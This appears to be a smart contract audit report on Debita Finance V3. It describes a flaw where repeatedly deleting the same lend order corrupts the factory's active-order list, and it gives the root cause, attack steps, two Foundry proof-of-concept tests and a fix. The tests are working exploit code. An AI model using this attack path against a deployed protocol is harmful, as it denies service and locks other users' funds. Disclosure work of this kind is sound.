# A malicous user could delete the same `lendOffer` multiple times, causing DOS

### Summary

Deleting multiple times the same `lendOffer` will  corrupt  the data in the  `DLOFactory::allActiveLendOrders` mapping, which is used for searching of possible lend offers for creation of loan. A malicious user could delete all of the entires in the mapping setting them to `address(0)` and setting the `activeOrdersCount` back to 0 as there are no active lend offers. This will cause an underflow when other users are trying to cancel their orders, leaving them unable to withdraw their available funds, locking them in the contract, slso the `matchOffersV3` will revert with underflow  when lendOffer that has to be deleted after the successful matching(cause left without available amount), if such attack happens. 



Deleting the same `lendOffer` multiple times can corrupt the `DLOFactory::allActiveLendOrders` mapping, which is used to find lend offers for loans. A malicious user can exploit this to: 
1. Set all entries in the mapping to `address(0)`, effectively deleting them.
2. Reset the activeOrdersCount to 0, as though there are no active lend offers.

### Root Cause

In [DebitaLendOffer-Implementation.sol:171](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/DebitaLendOffer-Implementation.sol#L178) the variable `isActive` is not being set to `false` before deleting the order, that allows the action to be repeated multiple times, calling the `deleteOrder` multiple times till the list of active orders is emptied.

### Internal pre-conditions

1. There should be some active lend orders in the protocol.

### External pre-conditions

_No response_

### Attack Path

1. User needs to call `createLendOrder` with `_startedLendingAmount=0`, which makes the attack even easier since there is no check for creation of 0 principle amount lend orders.
2. Then user needs to call `changePerpetual(false)` on his lending order multiple times to wipe out the `allActiveLendOrders` mapping and set the `activeOrdersCount` back to 0. 

Another attack path: 
1. User can add funds to a cancelled offer  calling `addFunds` and than call `cancelOffer` to withdraw his funds and delete the already deleted order which will again cause disruption in the data structure in the Factory contract.

### Impact
This could lead to: 

1. Underflow on  lendOffer canceletion: When other users try to cancel their orders, they are unable to do so, because the `deleteOrder` function will cause an underflow, locking their funds in the contract, preventing withdrawal.
2. Reverts on matching : The `matchOffersV3` function fails (due to underflow) when it tries to delete a lendOffer that becomes empty after a successful match.
This attack could disrupt the system, leaving users' funds locked and breaking key functionality.

### PoC

In the `BasicDebitaAggregator.t.sol add this test showing how MatchOffersV3 function will break:
```solidity
function testMatchOffersWontWork() public {
        address attacker = makeAddr("attacker");
        bool[] memory oraclesActivated = allDynamicData.getDynamicBoolArray(1);
        oraclesActivated[0] = false;
        uint256[] memory ltvs = allDynamicData.getDynamicUintArray(1);
        ltvs[0] = 0;
        address[] memory acceptedPrinciples = allDynamicData.getDynamicAddressArray(1);
        acceptedPrinciples[0] = AERO;
        address[] memory oraclesPrinciples = allDynamicData.getDynamicAddressArray(1);
        oraclesPrinciples[0] = address(0x0);
        uint256[] memory ratio = allDynamicData.getDynamicUintArray(1);
        ratio[0] = 1e18;

        vm.startPrank(attacker);
        address lendOrderAddress = DLOFactoryContract.createLendOrder(
            false,
            oraclesActivated,
            false,
            ltvs,
            1000,
            8640000,
            86400,
            acceptedPrinciples,
            AERO,
            oraclesPrinciples,
            ratio,
            address(0x0),
            0
        );
        DLOImplementation(lendOrderAddress).changePerpetual(false);
        DLOImplementation(lendOrderAddress).changePerpetual(false);
        vm.stopPrank();

        address[] memory lendOrders = allDynamicData.getDynamicAddressArray(1);
        uint256[] memory lendAmountPerOrder = allDynamicData.getDynamicUintArray(1);
        uint256[] memory porcentageOfRatioPerLendOrder = allDynamicData.getDynamicUintArray(1);
        address[] memory principles = allDynamicData.getDynamicAddressArray(1);
        uint256[] memory indexForPrinciple_BorrowOrder = allDynamicData.getDynamicUintArray(1);
        uint256[] memory indexForCollateral_LendOrder = allDynamicData.getDynamicUintArray(1);
        uint256[] memory indexPrinciple_LendOrder = allDynamicData.getDynamicUintArray(1);
        indexForPrinciple_BorrowOrder[0] = 0;
        indexForCollateral_LendOrder[0] = 0;
        indexPrinciple_LendOrder[0] = 0;

        lendOrders[0] = address(LendOrder);
        lendAmountPerOrder[0] = 5e18;
        porcentageOfRatioPerLendOrder[0] = 10000;
        principles[0] = AERO;
        
        vm.expectRevert();
        DebitaV3AggregatorContract.matchOffersV3(
            lendOrders,
            lendAmountPerOrder,
            porcentageOfRatioPerLendOrder,
            address(BorrowOrder),
            principles,
            indexForPrinciple_BorrowOrder,
            indexForCollateral_LendOrder,
            indexPrinciple_LendOrder
        );
    }
```

This test shows how the cancelOrder will be DOSed: 

```solidity
function testLendOrderCannotBeCancelled() public {
        address attacker = makeAddr("attacker");
        bool[] memory oraclesActivated = allDynamicData.getDynamicBoolArray(1);
        oraclesActivated[0] = false;
        uint256[] memory ltvs = allDynamicData.getDynamicUintArray(1);
        ltvs[0] = 0;
        address[] memory acceptedPrinciples = allDynamicData.getDynamicAddressArray(1);
        acceptedPrinciples[0] = AERO;
        address[] memory oraclesPrinciples = allDynamicData.getDynamicAddressArray(1);
        oraclesPrinciples[0] = address(0x0);
        uint256[] memory ratio = allDynamicData.getDynamicUintArray(1);
        ratio[0] = 1e18;

        vm.startPrank(attacker);
        address lendOrderAddress = DLOFactoryContract.createLendOrder(
            false,
            oraclesActivated,
            false,
            ltvs,
            1000,
            8640000,
            86400,
            acceptedPrinciples,
            AERO,
            oraclesPrinciples,
            ratio,
            address(0x0),
            0
        );
        DLOImplementation(lendOrderAddress).changePerpetual(false);
        DLOImplementation(lendOrderAddress).changePerpetual(false);
        vm.stopPrank();
        vm.expectRevert();
        LendOrder.cancelOffer();
    }

```
    

### Mitigation

In all cases where there are operations with lend orders require that the order is active before proceeding with some actions: 
Example: 
```diff
function cancelOffer() public onlyOwner nonReentrant {
+      require(isActive, "Offer is not active");
        uint availableAmount = lendInformation.availableAmount;
        lendInformation.perpetual = false;
        lendInformation.availableAmount = 0;
        require(availableAmount > 0, "No funds to cancel");
        isActive = false;

        SafeERC20.safeTransfer(
            IERC20(lendInformation.principle),
            msg.sender,
            availableAmount
        );
        IDLOFactory(factoryContract).emitDelete(address(this));
        IDLOFactory(factoryContract).deleteOrder(address(this));
        // emit canceled event on factory
    }
```

Also make sure the `isActive` variable is always set to false before deleting an order.
